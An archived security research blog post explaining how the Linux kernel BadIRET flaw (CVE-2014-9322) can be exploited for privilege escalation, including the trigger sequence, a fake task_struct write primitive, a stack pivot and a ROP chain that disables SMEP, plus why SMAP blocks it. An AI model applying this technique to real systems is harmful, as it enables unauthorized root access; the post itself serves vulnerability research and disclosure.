					<a target="_blank" class="icon-social" href="https://web.archive.org/web/20171118232027/https://pinterest.com/pin/create/bookmarklet/?url=https://blogs.bromium.com/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/&amp;description=Exploiting%20%20%E2%80%9CBadIRET%E2%80%9D%20vulnerability%20(CVE-2014-9322,%20Linux%20kernel%20privilege%20escalation)&amp;media=https://blogs.bromium.com/wp-content/uploads/2015/02/Linux-869x1024.png"><i class="fa fa-pinterest"></i></a>
			</span>
			</div>
		</div><!-- .entry-head -->

	
	
			<div class="row">
			<div class="col-md-8 col-sm-12 col-xs-12">
	
			
													<figure class="entry-thumb">
						<a class="ci-lightbox" href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/wp-content/uploads/2015/02/Linux-869x1024.png"><img width="750" height="440" src="./2015 - Exploiting BadIRET vulnerability_files/Linux-750x440.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" srcset="https://web.archive.org/web/20171118232027im_/https://blogs.bromium.com/wp-content/uploads/2015/02/Linux-750x440.png 750w, https://web.archive.org/web/20171118232027im_/https://blogs.bromium.com/wp-content/uploads/2015/02/Linux-750x440@2x.png 1500w" sizes="(max-width: 750px) 100vw, 750px"></a>
					</figure>
				
				<div class="entry-content">
					<h2>Introduction</h2>
<p><a href="https://web.archive.org/web/20171118232027/http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9322"><br>
CVE-2014-9322</a> is described as follows:</p>
<pre> 
arch/x86/kernel/entry_64.S in the Linux kernel before 3.17.5 does not
properly handle faults associated with the Stack Segment (SS) segment
register, which allows local users to gain privileges by triggering an IRET
instruction that leads to access to a GS Base address from the wrong space. 
</pre>
<p>It was fixed on 23rd November 2014 with <a href="https://web.archive.org/web/20171118232027/http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=6f442be2fb22be02cafa606f1769fa1e6f894441"> this commit</a>.</p>
<p>I have seen neither a public exploit nor a detailed discussion about the issue. In this post I will try to explain the nature of the vulnerability and the exploitation steps as clearly as possible; unfortunately I cannot quote <a href="https://web.archive.org/web/20171118232027/http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html"> the full 3rd volume of Intel Software Developer’s Manuals</a>, so if some terminology is unknown to the reader then details can be found there.</p>
<p><span id="more-627"></span></p>
<p>All experiments were conducted on Fedora 20 system, running 64bit 3.11.10-301 kernel; all the discussion is 64bit-specific.</p>
<p>Short results summary:</p>
<ol>
<li>With the tested kernel, the vulnerability can be reliably exploited to achieve kernelmode<br>
arbitrary code execution.</li>
</ol>
<ul>
<li><a href="https://web.archive.org/web/20171118232027/http://vulnfactory.org/blog/2011/06/05/smep-what-is-it-and-how-to-beat-it-on-linux/">SMEP</a> does not prevent arbitrary code execution; <a href="https://web.archive.org/web/20171118232027/http://lwn.net/Articles/517475">SMAP</a> does prevent arbitrary code execution.<br>
<h2>Digression: kernel, usermode, iret</h2>
<p><img src="./2015 - Exploiting BadIRET vulnerability_files/badiret-cartoon.jpg" alt=""></p>
<h2>The vulnerability</h2>
<p>In a few cases, when Linux kernel returns to usermode via <b>iret</b>, this instruction throws an exception. The exception handler returns execution to <b>bad_iret</b> function, that does</p>
<pre>     /* So pretend we completed the iret and took the #GPF in user mode.*/
     pushq $0
     SWAPGS
     jmp general_protection
</pre>
<p>As the comment explains, the subsequent code flow should be identical to the case when<br>
general protection exception happens in user mode (just jump to the #GP handler). This works well in case of most of the exceptions that can be raised by <b>iret</b>, e.g. #GP.</p>
<p>The problematic case is #SS exception. If a kernel is vulnerable (so, before kernel version 3.17.5) and has “espfix” functionality (introduced around kernel version 3.16), then <b>bad_iret</b> executes with a read-only stack – “push” instruction generates a page fault that gets converted into double fault. I have not analysed this scenario; from now on, we focus on pre 3.16 kernel, with no “espfix”.</p>
<p>The vulnerability stems from the fact that the exception handler for the #SS exception does not fit the “pretend-it-was-#GP-in-userspace” schema well. In comparison with e.g. #GP handler, the #SS exception handler does one extra <b>swapgs</b> instruction. In case you are not familiar with <b>swapgs</b> semantics, read the below paragraph, otherwise skip it.</p>
<h2>Digression: swapgs instruction</h2>
<p>When memory is accessed with gs segment prefix, like this:</p>
<pre>mov %gs:LOGICAL_ADDRESS, %eax
</pre>
<p>the following actually happens:</p>
<ol>
<li>BASE_ADDRESS value is retrieved from the hidden part of the segment register</li>
<li>memory at linear address LOGICAL_ADDRESS+BASE_ADDRESS is dereferenced</li>
</ol>
<p>The base address is initially derived from Global Descriptor Table (or LDT). However, there are situations where GS segment base is changed on the fly, without involving GDT.</p>
<p>Quoting SDM:</p>
<p>“SWAPGS exchanges the current GS base register value with the value contained<br>
in MSR address C0000102H<br>
(IA32_KERNEL_GS_BASE). The SWAPGS instruction is a privileged instruction<br>
intended for use by system software. (…) The kernel can then use the GS prefix on<br>
normal memory references to access [per-cpu]kernel data structures.”</p>
<p>For each CPU, Linux kernel allocates at boot time a fixed-size structure holding crucial data. Then, for each CPU, Linux loads IA32_KERNEL_GS_BASE with this structure address. Therefore, the usual pattern of e.g. syscall handler is:</p>
<ol>
<li>swapgs (now the gs base points to kernel memory)</li>
<li>access per-cpu kernel data structures via memory instructions with <b>gs</b> prefix</li>
<li>swapgs (it undos the result of the previous swapgs, gs base points to usermode memory)</li>
<li>return to usermode</li>
</ol>
<p>Naturally, kernel code must ensure that whenever it wants to access percpu data with gs prefix, the number of <b>swapgs</b> instructions executed by the kernel since entry from usermode is noneven (so that gs base points to kernel memory).</p>
<h2>Triggering the vulnerability</h2>
<p>By now it should be obvious that the vulnerability is grave – because of one extra <b>swapgs </b> in the vulnerable code path, kernel will try to access important data structures with a wrong gs base, controllable by the user.</p>
<p>When is #SS exception thrown by the <b>iret</b> instruction? Interestingly, the Intel SDM is incomplete in this aspect; in the description of <b>iret</b> instruction, it says:</p>
<pre> 64-Bit Mode Exceptions:
 #SS(0)
 If an attempt to pop a value off the stack violates the SS limit.
 If an attempt to pop a value off the stack causes a non-canonical address
 to be referenced.
</pre>
<p>None of these conditions can be forced to happen in kernel mode. However, the pseudocode for <b>iret</b> (in the same SDM) shows another case: when the segment defined by the return frame is not present:</p>
<pre>IF stack segment is not present
THEN #SS(SS selector); FI;
</pre>
<p>So, in usermode, we need to set <b>ss</b> register to something not present. It is not straighforward: we cannot just use</p>
<pre>mov $nonpresent_segment_selector, %eax
mov %ax, %ss
</pre>
<p>as the latter instruction will generate #GP. Setting the <b>ss</b> via debugger/ptrace is disallowed; similarly, the sys_sigreturn syscall does not set this register on 64bits system (it might work on 32bit, though). The solution is:</p>
<ol>
<li>thread A: create a custom segment X in LDT via sys_modify_ldt syscall</li>
<li>thread B: ss:=X_selector</li>
<li>thread A: invalidate X via sys_modify_ldt</li>
<li>thread B: wait for hardware interrupt</li>
</ol>
<p>The reason why one needs two threads (both in the same process) is that the return from the syscall (including sys_modify_ldt) is done via sysret instruction that hardcodes the <b>ss</b> value. If we invalidated X in the same thread that did “ss:=X instruction”, <b>ss</b> would be undone.</p>
<p>Running the above code results in kernel panic. In order to do something more meaningful, we will need to control usermode gs base; it can be set via arch_prctl(ARCH_SET_GS) syscall.</p>
<h2>Achieving write primitive</h2>
<p>If we run the above code, then #SS handler runs fine (meaning: it will not touch memory at gs base), returns into <b>bad_iret</b>, that in turn jumps to #GP exception handler. This runs fine for a while, and then calls the following function:</p>
<pre>289 dotraplinkage void
290 do_general_protection(struct pt_regs *regs, long error_code)
291 {
292         struct task_struct *tsk;
...
306         tsk = current;
307         if (!user_mode(regs)) {
                ... it is not reached
317         }
318 
319         tsk-&gt;thread.error_code = error_code;
320         tsk-&gt;thread.trap_nr = X86_TRAP_GP;
321 
322         if (show_unhandled_signals &amp;&amp; unhandled_signal(tsk, SIGSEGV) &amp;&amp;
323                         printk_ratelimit()) {
324                 pr_info("%s[%d] general protection ip:%lx sp:%lx
error:%lx",
325                         tsk-&gt;comm, task_pid_nr(tsk),
326                         regs-&gt;ip, regs-&gt;sp, error_code);
327                 print_vma_addr(" in ", regs-&gt;ip);
328                 pr_cont("\n");
329         }
330 
331         force_sig_info(SIGSEGV, SEND_SIG_PRIV, tsk);
332 exit:
333         exception_exit(prev_state);
334 }
</pre>
<p>It is far from obvious from the C code, but the assignment to <b>tsk</b> from <b>current</b> macro uses memory read with gs prefix. Line 306 is actually:</p>
<pre>0xffffffff8164b79d :	mov    %gs:0xc780,%rbx
</pre>
<p>This gets interesting. We control the “current” pointer, that points to the giant data structure describing the whole Linux process. Particularly, the lines</p>
<pre>319         tsk-&gt;thread.error_code = error_code;
320         tsk-&gt;thread.trap_nr = X86_TRAP_GP;
</pre>
<p>are writes to addresses (at some fixed offset from the beginning of the task struct) that we control. Note that the values being written are not controllable (they are 0 and 0xd constants, respectively), but this should not be a problem. Game over ?</p>
<p>Not quite. Say, we want to overwrite some important kernel data structure at X. If we do the following steps:</p>
<ol>
<li>prepare usermode memory at FAKE_PERCPU, and set gs base to it</li>
<li>Make the location FAKE_PERCPU+0xc780 hold the pointer FAKE_CURRENT_WITH_OFFSET, such that FAKE_CURRENT_WITH_OFFSET= X – offsetof(struct task_struct, thread.error_code)</li>
<li>trigger the vulnerability</li>
</ol>
<p>Then indeed do_general_protection will write to X. But soon afterwards it will try to access other fields in the current task_struct again; e.g. unhandled_signal() function dereferences a pointer from task_struct. We have no control what lies beyond X, and the result will be a page fault in kernel.</p>
<p>How can we cope with this? Options:</p>
<ol>
<li>Do nothing. Linux kernel, unlike e.g. Windows, is quite permissive when it gets an unexpected page fault in kernel mode – if possible, it kills the current process, and tries to continue (while Windows bluescreens immediately).This does not work – the result is massive kernel data corruption and whole system freeze. My suspicion is that after the current process is killed, the <b>swapgs</b> imbalance persists, resulting in many unexpected page faults in the context of the other processes.</li>
</ol>
<p>&nbsp;</p></li>
<li>Use the “tsk-&gt;thread.error_code = error_code” write to overwrite IDT entry for the page fault handler. Then the page fault (triggered by, say, unhandled_signal()) will result in running our code. This technique proved to be successful on a couple of occasions before.This does not work, either, for two reasons:</li>
<li>
<ul>
<li>Linux makes IDT read-only (bravo!)</li>
<li>even if IDT was writeable, we do not control the overwrite value – it is 0 or 0xd. If we overwrite the top DWORDS of IDT entry for #PF, the resulting address will be in usermode, and SMEP will prevent handler execution (more on SMEP later). We could nullify the lowest one or two bytes of the legal handler address, but the chances of these two addresses being an useful stack pivot sequence are negligible.</li>
</ul>
<p>&nbsp;</p></li>
<li>We can try a race. Say, “tsk-&gt;thread.error_code = error_code” write facilitates code<br>
execution, e.g. allows to control code pointer P that is called via SOME_SYSCALL. Then we can trigger our vulnerability on CPU 0, and at the same time CPU 1 can run SOME_SYSCALL in a loop. The idea is that we will get code execution via CPU 1 before damage is done on CPU 0, and e.g. hook the page fault handler, so that CPU 0 can do no more harm.I tried this approach a couple of times, with no luck; perhaps with different vulnerability the timings would be different and it would work better.</li>
<li>Throw a towel on “tsk-&gt;thread.error_code = error_code” write.With some disgust, we will follow the last option. We will point “current” to usermode location, setting the pointers in it so that the read dereferences on them hit our (controlled) memory. Naturally, we inspect the subsequent code to find more pointer write dereferences.<br>
<h2>Achieving write primitive continued, aka life after do_general_protection</h2>
<p>Our next chance is the function called by do_general_protection():</p>
<pre>int
force_sig_info(int sig, struct siginfo *info, struct task_struct *t)
{
        unsigned long int flags;
        int ret, blocked, ignored;
        struct k_sigaction *action;

        spin_lock_irqsave(&amp;t-&gt;sighand-&gt;siglock, flags);
        action = &amp;t-&gt;sighand-&gt;action[sig-1];
        ignored = action-&gt;sa.sa_handler == SIG_IGN;
        blocked = sigismember(&amp;t-&gt;blocked, sig);   
        if (blocked || ignored) {
                action-&gt;sa.sa_handler = SIG_DFL;
                if (blocked) {
                        sigdelset(&amp;t-&gt;blocked, sig);
                        recalc_sigpending_and_wake(t);
                }
        }
        if (action-&gt;sa.sa_handler == SIG_DFL)
                t-&gt;signal-&gt;flags &amp;= ~SIGNAL_UNKILLABLE;
        ret = specific_send_sig_info(sig, info, t);
        spin_unlock_irqrestore(&amp;t-&gt;sighand-&gt;siglock, flags);

        return ret;
}
</pre>
<p>The field “sighand” in task_struct is a pointer, that we can set to an arbitrary value. It means that the</p>
<pre>action = &amp;t-&gt;sighand-&gt;action[sig-1];
action-&gt;sa.sa_handler = SIG_DFL;
</pre>
<p>lines are another chance for write primitive to an arbitrary location. Again, we do not control the write value – it is the constant SIG_DFL, equal to 0.</p>
<p>This finally works, hurray ! with a little twist. Assume we want to overwrite location X in the kernel. We prepare our fake task_struct (particularly sighand field in it) so that X = address of t-&gt;sighand-&gt;action[sig-1].sa.sa_handler. But a few lines above, there is a line</p>
<pre>spin_lock_irqsave(&amp;t-&gt;sighand-&gt;siglock, flags);
</pre>
<p>As t-&gt;sighand-&gt;siglock is at constant offset from t-&gt;sighand-&gt;action[sig-1].sa.sa_handler, it means kernel will call spin_lock_irqsave on some address located after X, say at X+SPINLOCK, whose content we do not control. What happens then?</p>
<p>There are two possibilities:</p>
<ol>
<li>memory at X+SPINLOCK looks like an unlocked spinlock. spin_lock_irqsave will complete immediately. Final spin_unlock_irqrestore will undo the writes done by spin_lock_irqsave. Good.</li>
<li>memory at X+SPINLOCK looks like a locked spinlock. spin_lock_irqsave will loop waiting for the spinlock – infinitely, if we do not react.This is worrying. In order to bypass this, we will need another assumption – we will need to know we are in this situation, meaning we will need to know the contents of memory at X+SPINLOCK. This is acceptable – we will see later that we will set X to be in kernel .data section. We will do the following:</li>
</ol>
</li>
<li>
<ul>
<li>initially, prepare FAKE_CURRENT so that t-&gt;sighand-&gt;siglock points to a locked spinlock in usermode, at SPINLOCK_USERMODE</li>
<li>force_sig_info() will hang in spin_lock_irqsave</li>
<li>at this moment, another usermode thread running on another CPU will change t-&gt;sighand, so that t-&gt;sighand-&gt;action[sig-1].sa.sa_handler is our overwrite target, and then unlock SPINLOCK_USERMODE</li>
<li>spin_lock_irqsave will return.</li>
<li>force_sig_info() will reload t-&gt;sighand, and perform the desired write.</li>
</ul>
<p>A careful reader is encouraged to enquire why cannot use the latter approach in the case X+SPINLOCK is initially unlocked.</p>
<p>This is not all yet – we will need to prepare a few more fields in FAKE_CURRENT so that as little code as possible is executed. I will spare you the details – this blog is way too long already. The bottom line is that it works. What happens next? force_sig_info() returns, and do_general_protection() returns. The subsequent <b>iret</b> will throw #SS again (because still the usermode <b>ss</b> value on the stack refers to a nonpresent segment). But this time, the extra <b>swapgs</b> instruction in #SS handler will return the balance to the Force, cancelling the effect of the previous incorrect <b>swapgs</b>. do_general_protection() will be invoked and operate on real task_struct, not FAKE_CURRENT. Finally, the current task will be sent SIGSEGV, and another process will be scheduled for execution. The system remains stable.<br>
<a href="https://web.archive.org/web/20171118232027/http://blogs.bromium.com/wp-content/uploads/2015/01/diagram1.png" data-lightbox="gal[627]"><img src="./2015 - Exploiting BadIRET vulnerability_files/diagram1.png" alt="Diagram1"></a></p>
<h2>Digression: SMEP</h2>
<p><a href="https://web.archive.org/web/20171118232027/http://vulnfactory.org/blog/2011/06/05/smep-what-is-it-and-how-to-beat-it-on-linux/">SMEP</a> is a feature of Intel processors, starting from 3rd generation of Core processor. If the SMEP bit is set in CR4, CPU will refuse to execute code with kernel privileges if the code resides in usermode pages. Linux enables SMEP by default if available.</p>
<h2>Achieving code execution</h2>
<p>The previous paragraphs showed a way to overwrite 8 consecutive bytes in kernel memory with 0. How to turn this into code execution, assuming SMEP is enabled?</p>
<p>Overwriting a kernel code pointer would not work. We can either nullify its top bytes – but then the resulting address would be in usermode, and SMEP will prevent dereference of this pointer. Alternatively, we can nullify a few low bytes, but then the chances that the resulting pointer would point to an useful stack pivot sequence are low.</p>
<p>What we need is a kernel pointer P to structure X, that contains code pointers. We can overwrite top bytes of P so that the resulting address is in usermode, and P-&gt;code_pointer_in_x() call will jump to a location that we can choose.</p>
<p>I am not sure what is the best object to attack. For my experiments, I choose the kernel <b>proc_root</b> variable. It is a structure of type</p>
<pre>struct proc_dir_entry {
            ...
        const struct inode_operations *proc_iops;
        const struct file_operations *proc_fops;
        struct proc_dir_entry *next, *parent, *subdir;
        ...
        u8 namelen;
        char name[];
};
</pre>
<p>This structure represents an entry in the proc filesystem (and <b>proc_root</b> represents the root of the /proc filesystem). When a filename path starting with /proc is looked up, the “subdir” pointers (starting with <b>proc_root.subdir</b>) are followed, until the matching name is found. Afterwards, pointers from <b>proc_iops</b> are called:</p>
<pre>struct inode_operations {
        struct dentry * (*lookup) (struct inode *,struct dentry *, unsigned int);
        void * (*follow_link) (struct dentry *, struct nameidata *);
        ...many more...
        int (*update_time)(struct inode *, struct timespec *, int);
        ...
} ____cacheline_aligned;
</pre>
<p><b>proc_root</b> resides in the kernel data section. It means that the exploit needs to know its address. This information is available from /proc/kallsyms; however, many hardened kernels do not allow unprivileged users to read from this pseudofile. Still, if the kernel is a known build (say, shipped with a distribution), this address can be obtained offline; along with tens of offsets required to build FAKE_CURRENT.</p>
<p>So, we will ovewrite <b>proc_root.subdir</b> so that it becomes a pointer to a controlled struct<br>
proc_dir_entry residing in usermode. A slight complication is that we cannot overwrite the whole pointer. Remember, our write primitive is “overwrite with 8 zeroes”. If we made <b>proc_root.subdir</b> be 0, we would not be able to map it, because Linux does not allow usermode to map address 0 (more precisely, any address below /proc/sys/vm/mmap_min_addr, but the latter is 4k by default). It means we need to:</p>
<ol>
<li>map 16MB of memory at address 4096</li>
<li>fill it with a pattern resembling proc_dir_entry, with the <b>inode_operations</b> field pointing to usermode address FAKE_IOPS, and <b>name</b> field being “A” string.</li>
<li>configure the exploit to overwrite the top 5 bytes of proc_root.subdir</li>
</ol>
<p>Then, unless the bottom 3 bytes of <b>proc_root.subdir</b> are 0, we can be sure that after triggering the overwrite in force_sig_info() <b>proc_root.subdir</b> will point to controlled usermode memory. When our process will call open(“/proc/A”, …), pointers from FAKE_IOPS will be called. What should they point to?</p>
<p>If you think the answer is “to our shellcode”, go back and read again.</p>
<p>We will need to point FAKE_IOPS pointers to a <a href="https://web.archive.org/web/20171118232027/https://trailofbits.files.wordpress.com/2010/04/practical-rop.pdf">stack pivot</a> sequence. This again assumes the knowledge of the precise version of the kernel running. The usual “xchg %esp, %eax; ret” code sequence (it is two bytes only, 94 c3, found at 0xffffffff8119f1ed in case of the tested kernel), works very well for 64bit kernel ROP. Even if there is no control over %rax, this xchg instruction operates on 32bit registers, thus clearing the high 32bits of %rsp, and landing %rsp in usermode memory. At the worst case, we may need to allocate low 4GB of virtual memory and fill it with rop chain.</p>
<p>In the case of the tested kernel, two different ways to dereference pointers in FAKE_IOPS were observed:</p>
<ol>
<li>%rax:=FAKE_IOPS; call *SOME_OFFSET(%rax)</li>
<li>%rax:=FAKE_IOPS; %rax:=SOME_OFFSET(%rax); call *%rax</li>
</ol>
<p>In the first case, after %rsp is exchanged with %rax, it will be equal to FAKE_IOPS. We need the rop chain to reside at the beginning of FAKE_IOPS, so it needs to start with something like “add $A_LOT, %rsp; ret”, and continue after the end of FAKE_IOPS pointers.</p>
<p>In the second case, the %rsp will be assigned the low 32bits of the call target, so 0x8119f1ed. We need to prepare the rop chain at this address as well.</p>
<p>To sum up, as the %rax value has one of two known values at the moment of the entry to the stack pivot sequence, we do not need to fill the whole 4G with rop chain, just the above two addresses.</p>
<p>The ROP chain itself is straightforward, shown for the second case:</p>
<pre>unsigned long *stack=0x8119f1ed;
*stack++=0xffffffff81307bcdULL;  // pop rdi, ret
*stack++=0x407e0;                //cr4 with smep bit cleared
*stack++=0xffffffff8104c394ULL;  // mov rdi, cr4; pop %rbp; ret
*stack++=0xaabbccdd;             // placeholder for rbp
*stack++=actual_shellcode_in_usermode_pages;
</pre>
<p><a href="https://web.archive.org/web/20171118232027/http://blogs.bromium.com/wp-content/uploads/2015/01/diagram2.png" data-lightbox="gal[627]"><img src="./2015 - Exploiting BadIRET vulnerability_files/diagram2.png" alt="Diagram2"></a></p>
<h2>Digression: SMAP</h2>
<p><a href="https://web.archive.org/web/20171118232027/http://lwn.net/Articles/517475/">SMAP</a> is a feature of Intel processors, starting from 5th generation of Core processor. If the SMAP bit is set in CR4, CPU will refuse to access memory with kernel privileges if this memory resides in usermode pages. Linux enables SMAP by default if available. A test kernel module (run on an a system with Core-M 5Y10a CPU) that tries to access usermode crashes with:</p>
<pre>[  314.099024] running with cr4=0x3407e0
[  389.885318] BUG: unable to handle kernel paging request at 00007f9d87670000
[  389.885455] IP: [ffffffffa0832029] test_write_proc+0x29/0x50 [smaptest]
[  389.885577] PGD 427cf067 PUD 42b22067 PMD 41ef3067 PTE 80000000408f9867
[  389.887253] Code: 48 8b 33 48 c7 c7 3f 30 83 a0 31 c0 e8 21 c1 f0 e0 44 89 e0 48 8b 
</pre>
<p>As we can see, although the usermode page is present, access to it throws a page fault.</p>
<p>Windows systems do not seem to support SMAP; Windows 10 Technical Preview build 9926 runs with cr4=0x1506f8 (SMEP set, SMAP unset); in comparison with Linux (that was tested on the same hardware) you can see that bit 21 in cr4 is not set. This is not surprising; in case of Linux, access to usermode is performed explicitely, via copy_from_user, copy_to_user and similar functions, so it is doable to turn off SMAP temporarily for the duration of these functions. On Windows, kernel code accesses usermode directly, just wrapping the access in the exception handler, so it is more difficult to adjust all the drivers in all required places to work properly with SMAP.</p>
<h2>SMAP to the rescue!</h2>
<p>The above exploitation method relied on preparing certain data structures in usermode and forcing the kernel to interpret them as trusted kernel data. This approach will not work with SMAP enabled – CPU will refuse to read malicious data from usermode.</p>
<p>What we could do is to craft all the required data structures, and then copy them to the kernel. For instance if one does</p>
<pre>write(pipe_filedescriptor, evil_data, ...
</pre>
<p>then evil_data will be copied to a kernel pipe buffer. We would need to guess its address; some sort of heap spraying, combined with the fact that <a href="https://web.archive.org/web/20171118232027/http://labs.bromium.com/2014/10/27/tsx-improves-timing-attacks-against-kaslr/"> there is no spoon^W effective kernel ASLR</a>, could work, although it is likely to be less reliable than exploitation without SMAP.</p>
<p>However, there is one more hurdle – remember, we need to set usermode gs base to point to our exploit data structures. In the scenario above (without SMAP), we used arch_prctl(ARCH_SET_GS) syscall, that is implemented in the following way in the kernel:</p>
<pre>long do_arch_prctl(struct task_struct *task, int code, unsigned long addr)
{ 
         int ret = 0; 
         int doit = task == current;
         int cpu;
 
         switch (code) { 
         case ARCH_SET_GS:
                 if (addr &gt;= TASK_SIZE_OF(task))
                         return -EPERM; 
                 ... honour the request otherwise
</pre>
<p>Houston, we have a problem – we cannot use this API to set gs base above the end of usermode memory !</p>
<p>Recent CPUs feature <b>wrgsbase</b> instruction, that sets the gs base directly. This is a nonprivileged instruction, but needs to be enabled by the kernel by setting the FSGSBASE bit (no 16) in CR4. Linux does not set this bit, and therefore usermode cannot use this instruction.</p>
<p>On 64bits, nonsystem entries in GDT and LDT are still 8 bytes long, and the base field is at most 4G-1 – so, no chance to set up a segment with base address in kernel space.</p>
<p>So, unless I missed another way to set usermode gs base in the kernel range, SMAP protects 64bit Linux against achieving arbitrary code execution via exploiting CVE-2014-9322.</p></li>
</ul>

<div id="jp-relatedposts" class="jp-relatedposts">
	
</div>					
														</div><!-- .entry-content -->

				
				<div class="entry-navigation">
				<a href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/risky-clicks-end-users-cause-the-majority-of-security-headaches/" class="entry-prev">
			<span><i class="fa fa-angle-left"></i> Previous Article</span>
			<p class="entry-navigation-title">Risky Clicks: End users cause the majority of security headaches</p>
		</a>
	
			<a href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/the-vicious-cycle-of-assuming-compromise/" class="entry-next">
			<span>Next Article <i class="fa fa-angle-right"></i></span>
			<p class="entry-navigation-title">The Vicious Cycle of “Assuming Compromise”</p>
		</a>
	</div><!-- .entry-navigation -->

				<div class="entry-author-box">
	<div class="entry-author-avatar">
		<img src="./2015 - Exploiting BadIRET vulnerability_files/bf3a3d5cfd0dd7d76bed937cf30a36e0" width="100" height="100" alt="Rafal Wojtczuk" class="avatar avatar-100 wp-user-avatar wp-user-avatar-100 photo avatar-default">	</div>

	<div class="entry-author-info">
		<p class="entry-author-name">
			Rafal Wojtczuk							<a href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/author/rafalwojtczuk/">
					View all posts				</a>
					</p>

		
		<div class="entry-author-socials">
								<ul class="social-icons">
			<li><a target="_blank" href="https://web.archive.org/web/20171118232027/https://www.facebook.com/bromium" class="icon-social"><i class="fa fa-facebook"></i></a></li><li><a target="_blank" href="https://web.archive.org/web/20171118232027/https://twitter.com/bromium" class="icon-social"><i class="fa fa-twitter"></i></a></li><li><a target="_blank" href="https://web.archive.org/web/20171118232027/http://www.linkedin.com/company/bromium" class="icon-social"><i class="fa fa-linkedin"></i></a></li>					</ul>
				</div>
	</div>
</div>

					<div class="entry-related">
					<h3 class="section-title">You may also like</h3>
		
		<div class="row">
							<div class="col-sm-6 col-xs-12">
					<article id="post-11" class="item post-11 post type-post status-publish format-standard has-post-thumbnail hentry category-threats">
			<figure class="item-thumb">
			<a href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/introducing-lava-2/"><img width="360" height="245" src="./2015 - Exploiting BadIRET vulnerability_files/lava-1-360x245.jpg" class="attachment-noozbeat_media size-noozbeat_media wp-post-image" alt="" srcset="https://web.archive.org/web/20171118232027im_/https://blogs.bromium.com/wp-content/uploads/2012/10/lava-1-360x245.jpg 360w, https://web.archive.org/web/20171118232027im_/https://blogs.bromium.com/wp-content/uploads/2012/10/lava-1-360x245@2x.jpg 720w" sizes="(max-width: 360px) 100vw, 360px"></a>
		</figure>
	
	<div class="item-content">
					<div class="item-meta">
				<time class="item-time" datetime="2012-10-12T14:37:42+00:00">October 12, 2012</time>
			</div>
		
		<h1 class="item-title"><a href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/introducing-lava-2/">Introducing LAVA</a></h1>
	</div>
</article>
				</div>
							<div class="col-sm-6 col-xs-12">
					<article id="post-25" class="item post-25 post type-post status-publish format-standard has-post-thumbnail hentry category-threats">
			<figure class="item-thumb">
			<a href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/are-playing-sandbox-roulette/"><img width="360" height="245" src="./2015 - Exploiting BadIRET vulnerability_files/bypass_sandbox-680x400-360x245.jpg" class="attachment-noozbeat_media size-noozbeat_media wp-post-image" alt=""></a>
		</figure>
	
	<div class="item-content">
					<div class="item-meta">
				<time class="item-time" datetime="2013-03-15T18:54:08+00:00">March 15, 2013</time>
			</div>
		
		<h1 class="item-title"><a href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/are-playing-sandbox-roulette/">BlackHat EU’13: Are You Playing Sandbox Roulette?</a></h1>
	</div>
</article>
				</div>
								</div>
	</div><!-- .entry-related -->

				




			
		</div><!-- .col-md-8 .col-sm-12 .col-xs-12 -->

		<div class="col-md-4 col-sm-12 col-xs-12">
			<div class="sidebar">
	<aside id="ci-socials-1" class="widget group widget_ci-socials"><h3 class="widget-title">Social</h3>		<ul class="social-icons">
			<li><a target="_blank" href="https://web.archive.org/web/20171118232027/https://www.facebook.com/bromium" class="icon-social"><i class="fa fa-facebook"></i></a></li><li><a target="_blank" href="https://web.archive.org/web/20171118232027/https://twitter.com/bromium" class="icon-social"><i class="fa fa-twitter"></i></a></li><li><a target="_blank" href="https://web.archive.org/web/20171118232027/http://www.linkedin.com/company/bromium" class="icon-social"><i class="fa fa-linkedin"></i></a></li>							<li><a target="_blank" href="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/feed/" class="icon-social"><i class="fa fa-rss"></i></a></li>
					</ul>
		</aside><aside id="blog_subscription-2" class="widget group jetpack_subscription_widget"><h3 class="widget-title">Subscribe via Email</h3>
			<form action="https://web.archive.org/web/20171118232027/https://blogs.bromium.com/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/#" method="post" accept-charset="utf-8" id="subscribe-blog-blog_subscription-2">
				<div id="subscribe-text"></div><p>Join 26,160 other subscribers</p>
					<p id="subscribe-email">
						<label id="jetpack-subscribe-label" for="subscribe-field-blog_subscription-2" style="clip: rect(1px, 1px, 1px, 1px); position: absolute; height: 1px; width: 1px; overflow: hidden;">
							Email Address						</label>
						<input type="email" name="email" required="required" class="required" value="" id="subscribe-field-blog_subscription-2" placeholder="Email Address">
					</p>

					<p id="subscribe-submit">
						<input type="hidden" name="action" value="subscribe">
						<input type="hidden" name="source" value="https://blogs.bromium.com/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/">
						<input type="hidden" name="sub-type" value="widget">
						<input type="hidden" name="redirect_fragment" value="blog_subscription-2">
												<input type="submit" value="Subscribe" name="jetpack_subscriptions_widget">
					</p>
							</form>

			<script>
			/*
			Custom functionality for safari and IE
			 */
			(function( d ) {
				// In case the placeholder functionality is available we remove labels
				if ( ( 'placeholder' in d.createElement( 'input' ) ) ) {
					var label = d.querySelector( 'label[for=subscribe-field-blog_subscription-2]' );
						label.style.clip 	 = 'rect(1px, 1px, 1px, 1px)';
						label.style.position = 'absolute';
						label.style.height   = '1px';
						label.style.width    = '1px';
						label.style.overflow = 'hidden';
				}

				// Make sure the email value is filled in before allowing submit
				var form = d.getElementById('subscribe-blog-blog_subscription-2'),
					input = d.getElementById('subscribe-field-blog_subscription-2'),
					handler = function( event ) {
						if ( '' === input.value ) {
							input.focus();

							if ( event.preventDefault ){
								event.preventDefault();
							}

							return false;
						}
					};

				if ( window.addEventListener ) {
					form.addEventListener( 'submit', handler, false );
				} else {
					form.attachEvent( 'onsubmit', handler );
				}
			})( document );
			</script>
				
